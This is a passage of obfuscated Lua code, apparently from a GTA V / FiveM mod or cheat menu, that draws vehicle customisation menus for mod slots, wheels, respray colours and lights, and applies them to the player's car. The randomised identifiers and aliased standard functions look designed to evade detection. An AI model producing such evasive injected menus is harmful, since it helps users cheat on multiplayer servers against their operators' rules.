                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 42, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil   
                                end   
                            elseif curvopt1 == "Aerials" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 43)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 43, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 43, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil      
                                end   
                            elseif curvopt1 == "Trim 2" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 44)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 44, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 44, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                               
                                end
                            elseif curvopt1 == "Tank" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 45)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 45, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 45, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Windows" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 46)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 46, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 46, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil 
                                end
                            elseif curvopt1 == "Livery" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 48)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 48, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 90 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 90
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 48, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                           
                                end
                            elseif curvopt1 == "Wheels" then
                                local isbikeyea = nlFXKkFxuKQAk.natives.GetVehicleClass(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
                                if isbikeyea == 8 then
                                    for i, paint in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.colorsClassic) do
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WColor.items, paint.name)
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WColor.values, paint.id)
                                    end
                                    local refresh = true
                                    nlFXKkFxuKQAk.natives.SetVehicleWheelType(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 6)
                                    local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23)
                                    for j = 0, modCount, 1 do
                                        local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23, j)
                                        if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                            namerino = 'Stock'
                                        else
                                            namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                        end
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WChanger1.items2, namerino)
                                    end
                                    if refresh then
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Front Wheel', REVMYmrswsZvxOXvJE.WChanger1.items2, REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex = currentIndex 
                                            REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex = selectedIndex
                                        end, 3, 50) then nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex - 1) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') end
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Rear Wheel', REVMYmrswsZvxOXvJE.WChanger1.items2, REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex2, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex2, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex2 = currentIndex 
                                            REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex2 = selectedIndex
                                        end, 3, 70) then nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 24, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex2 - 1) end
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Color', REVMYmrswsZvxOXvJE.WColor.items, REVMYmrswsZvxOXvJE.WColor.currentItemIndex, REVMYmrswsZvxOXvJE.WColor.selectedItemIndex, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.WColor.currentItemIndex = currentIndex 
                                            REVMYmrswsZvxOXvJE.WColor.selectedItemIndex = selectedIndex
                                        end, 3, 90) then nlFXKkFxuKQAk.natives.SetVehicleExtraColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), nil, REVMYmrswsZvxOXvJE.WColor.values[REVMYmrswsZvxOXvJE.WColor.selectedItemIndex]) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') end
                                    end
                                else
                                    local refresh = true
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Wheel Type', REVMYmrswsZvxOXvJE.WChanger.items, REVMYmrswsZvxOXvJE.WChanger.currentItemIndex, REVMYmrswsZvxOXvJE.WChanger.selectedItemIndex, function(currentIndex, selectedIndex)
                                        REVMYmrswsZvxOXvJE.WChanger.currentItemIndex = currentIndex 
                                        REVMYmrswsZvxOXvJE.WChanger.selectedItemIndex = selectedIndex
                                    end, 3, 50) then nlFXKkFxuKQAk.natives.SetVehicleWheelType(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), REVMYmrswsZvxOXvJE.WChanger.values[REVMYmrswsZvxOXvJE.WChanger.selectedItemIndex]) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                        local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23)
                                        for i = 0, 1000, 1 do
                                            RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WChanger1.items)
                                            RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WColor.items)
                                            RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WColor.values)
                                            refresh = false
                                        end
                                    for j = 0, modCount, 1 do
                                        local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23, j)
                                        if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                            namerino = 'Stock'
                                        else
                                            namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                        end
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WChanger1.items, namerino)
                                    end
                                    for i, paint in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.colorsClassic) do
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WColor.items, paint.name)
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.WColor.values, paint.id)
                                    end
                                    end
                                    if refresh then
                                        local pearlescentColor, wheelColor = nlFXKkFxuKQAk.natives.GetVehicleExtraColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Wheels', REVMYmrswsZvxOXvJE.WChanger1.items, REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.WChanger1.currentItemIndex = currentIndex 
                                            REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex = selectedIndex
                                        end, 3, 70) then nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 23, REVMYmrswsZvxOXvJE.WChanger1.selectedItemIndex - 1) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') end
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Color', REVMYmrswsZvxOXvJE.WColor.items, REVMYmrswsZvxOXvJE.WColor.currentItemIndex, REVMYmrswsZvxOXvJE.WColor.selectedItemIndex, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.WColor.currentItemIndex = currentIndex 
                                            REVMYmrswsZvxOXvJE.WColor.selectedItemIndex = selectedIndex
                                        end, 3, 90) then nlFXKkFxuKQAk.natives.SetVehicleExtraColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), pearlescentColor, REVMYmrswsZvxOXvJE.WColor.values[REVMYmrswsZvxOXvJE.WColor.selectedItemIndex]) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') end
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == 'Respray' then
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Refresh Colors', 3, 40, 160) then
                                    for i, classic in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.colorsClassic) do
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.clasic, classic.name)
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.clasicval, classic.id)
                                    end
                                    for i, matte in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.colorsMatte) do
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.matte, matte.name)
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.matteval, matte.id)
                                    end
                                    for i, metal in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.colorsMetal) do
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.metal, metal.name)
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.ReColor.metalval, metal.id)
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Classic Colors', REVMYmrswsZvxOXvJE.ReColor.clasic, REVMYmrswsZvxOXvJE.ReColor.CIIc, REVMYmrswsZvxOXvJE.ReColor.SIIc, function(currentIndex, selectedIndex)
                                    REVMYmrswsZvxOXvJE.ReColor.CIIc = currentIndex 
                                    REVMYmrswsZvxOXvJE.ReColor.SIIc = selectedIndex
                                end, 3, 50) then 
                                    local input = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("1 = Primary, 2 = Secondary, 3 = Pearlescent", "", 1)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Changed Color!')
                                    DmSgpcIoUEJtyTfBBt.FunFunc.chosecolorchange(RfPsUKHSFWJuBEJuz.rE.LumToNum(input), REVMYmrswsZvxOXvJE.ReColor.clasicval[REVMYmrswsZvxOXvJE.ReColor.SIIc])
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Matte Colors', REVMYmrswsZvxOXvJE.ReColor.matte, REVMYmrswsZvxOXvJE.ReColor.CIImat, REVMYmrswsZvxOXvJE.ReColor.SIImat, function(currentIndex, selectedIndex)
                                    REVMYmrswsZvxOXvJE.ReColor.CIImat = currentIndex 
                                    REVMYmrswsZvxOXvJE.ReColor.SIImat = selectedIndex
                                end, 3, 70) then 
                                    local input = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("1 = Primary, 2 = Secondary, 3 = Pearlescent", "", 1)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Changed Color!')
                                    DmSgpcIoUEJtyTfBBt.FunFunc.chosecolorchange(RfPsUKHSFWJuBEJuz.rE.LumToNum(input), REVMYmrswsZvxOXvJE.ReColor.matteval[REVMYmrswsZvxOXvJE.ReColor.SIImat])
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Metals', REVMYmrswsZvxOXvJE.ReColor.metal, REVMYmrswsZvxOXvJE.ReColor.CIImet, REVMYmrswsZvxOXvJE.ReColor.SIImet, function(currentIndex, selectedIndex)
                                    REVMYmrswsZvxOXvJE.ReColor.CIImet = currentIndex 
                                    REVMYmrswsZvxOXvJE.ReColor.SIImet = selectedIndex
                                end, 3, 90) then 
                                    local input = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("1 = Primary, 2 = Secondary, 3 = Pearlescent", "", 1)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Changed Color!')
                                    DmSgpcIoUEJtyTfBBt.FunFunc.chosecolorchange(RfPsUKHSFWJuBEJuz.rE.LumToNum(input), REVMYmrswsZvxOXvJE.ReColor.metalval[REVMYmrswsZvxOXvJE.ReColor.SIImet])
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == 'Lights' then
                                local vprop = jrnyLearIyzKiSIen.func.VehProperties(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
                                local ismoto = nlFXKkFxuKQAk.natives.GetVehicleClass(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))

                                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Xenon Lights', vprop['modXenon'], function(enabled) vprop['modXenon'] = enabled end, 3, 50) then
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                    if vprop['modXenon'] then
                                        nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 22, true)
                                    else
                                        nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 22, false)
                                    end
                                end
                                if ismoto == 8 then
                                else
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Neon Lights', jrnyLearIyzKiSIen.config.features.UnderGC, function(enabled) jrnyLearIyzKiSIen.config.features.UnderGC = enabled end, 3, 70) then
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                        if jrnyLearIyzKiSIen.config.features.UnderGC then
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0, true)
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1, true)
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2, true)
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3, true)
                                        else
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0, false)
